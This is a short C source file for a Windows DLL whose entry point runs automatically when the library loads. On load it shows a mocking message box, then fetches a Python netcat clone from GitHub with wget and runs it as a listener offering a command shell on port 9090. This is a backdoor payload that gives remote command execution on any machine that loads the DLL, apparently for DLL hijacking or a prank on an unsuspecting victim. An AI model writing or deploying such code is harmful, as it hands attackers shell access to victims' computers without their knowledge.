#include <windows.h>

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            MessageBox(NULL, "I love balls in my face lol.. so sus lol i cant beluve you fell for it lmfao lol", "balls", MB_ICONERROR | MB_OK);
            int i;
            i = system ("wget https://raw.githubusercontent.com/stackviolator/blackhatpython/main/networking/netcat/netcat.py -o .\\nc.py");
            i = system ("python .\\nc.py -t 10.118.53.64 -l -c -p 9090");
            break;
    }
    return TRUE;
}
